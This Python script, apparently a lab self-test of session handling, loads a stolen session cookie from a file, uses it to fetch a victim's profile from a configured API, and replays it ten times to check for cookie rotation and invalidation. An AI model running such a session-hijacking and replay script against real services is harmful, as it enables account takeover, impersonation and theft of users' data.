"""
ATTACKER SCRIPT 2: Use Stolen Cookie
SEN SALDIRGANSIN! Çalınan cookie ile kurbanın hesabına eriş!
"""

import requests
import json
import time
from colorama import init, Fore, Style
from config import API_URL

init()

print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
print(f"{Fore.RED}🔴 ATTACKER: USING STOLEN COOKIE{Style.RESET_ALL}")
print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")

# Çalınan cookie'yi yükle
try:
    with open('attacker_cookie.json', 'r') as f:
        stolen_cookie = json.load(f)
    
    print(f"{Fore.RED}[ATTACKER/YOU] Loaded stolen cookie{Style.RESET_ALL}")
    print(f"  Cookie: {stolen_cookie}\n")
    
except FileNotFoundError:
    print(f"{Fore.RED}❌ attacker_cookie.json not found!{Style.RESET_ALL}")
    print("Önce attacker_steal_cookie.py çalıştır!")
    exit(1)

# Saldırgan session oluştur
attacker_session = requests.Session()

# Çalınan cookie'leri ekle
for key, value in stolen_cookie.items():
    attacker_session.cookies.set(key, value)

print(f"{Fore.RED}[ATTACKER/YOU] Attempting to access victim's account...{Style.RESET_ALL}\n")

# TEST 1: Kurbanın bilgilerine eriş
print(f"{Fore.YELLOW}TEST 1: Accessing victim's profile{Style.RESET_ALL}")
print("-"*60)

response = attacker_session.get(f"{API_URL}/users/me")

if response.status_code == 200:
    user_data = response.json()
    
    print(f"{Fore.RED}🔴 SUCCESS! You accessed victim's account!{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Victim's data:{Style.RESET_ALL}")
    print(json.dumps(user_data, indent=2))
    
    print(f"\n{Fore.RED}⚠️  You can now:{Style.RESET_ALL}")
    print("  - Read victim's messages")
    print("  - Send messages as victim")
    print("  - Change victim's profile")
    print("  - Delete victim's data")
    
else:
    print(f"{Fore.GREEN}✅ SAFE - Access denied: {response.status_code}{Style.RESET_ALL}")
    print(f"   Cookie was invalidated or expired")
    exit(0)

# TEST 2: Cookie Replay (10 kez dene)
print(f"\n{Fore.YELLOW}TEST 2: Cookie Replay Attack{Style.RESET_ALL}")
print("-"*60)

print(f"{Fore.RED}[ATTACKER/YOU] Replaying cookie 10 times...{Style.RESET_ALL}\n")

success_count = 0

for i in range(10):
    response = attacker_session.get(f"{API_URL}/users/me")
    
    if response.status_code == 200:
        success_count += 1
        print(f"  [{i+1}] {Fore.RED}✅ Still works!{Style.RESET_ALL}")
    else:
        print(f"  [{i+1}] {Fore.GREEN}❌ Blocked{Style.RESET_ALL}")
        break
    
    time.sleep(0.3)

# Sonuç
print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
print(f"{Fore.RED}ATTACK RESULTS{Style.RESET_ALL}")
print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")

print(f"Success Rate: {success_count}/10 ({success_count*10}%)")

if success_count == 10:
    print(f"\n{Fore.RED}🔴 CRITICAL VULNERABILITY!{Style.RESET_ALL}")
    print(f"{Fore.RED}   Cookie can be replayed indefinitely!{Style.RESET_ALL}")
    print(f"{Fore.RED}   You have permanent access to victim's account!{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}What you can do:{Style.RESET_ALL}")
    print("  1. Access account anytime (even after victim logs out)")
    print("  2. Read all messages")
    print("  3. Impersonate victim")
    print("  4. Steal sensitive data")
    
elif success_count == 0:
    print(f"\n{Fore.GREEN}✅ SAFE{Style.RESET_ALL}")
    print("   Cookie was invalidated after first use")
else:
    print(f"\n{Fore.YELLOW}⚠️  PARTIAL VULNERABILITY{Style.RESET_ALL}")
    print(f"   Cookie valid for {success_count} uses")

# TEST 3: Kurban hala erişebiliyor mu?
print(f"\n{Fore.YELLOW}TEST 3: Checking if victim still has access{Style.RESET_ALL}")
print("-"*60)

print("\n💡 Kurban (ben) şimdi kendi hesabına erişmeyi denemeli.")
print("   Eğer ben de erişebiliyorsam:")
print("   🔴 İkimiz de aynı anda erişebiliyoruz!")
print("   🔴 Cookie rotation yok!")

print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
print(f"{Fore.RED}🔴 ATTACK COMPLETE!{Style.RESET_ALL}")
print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")
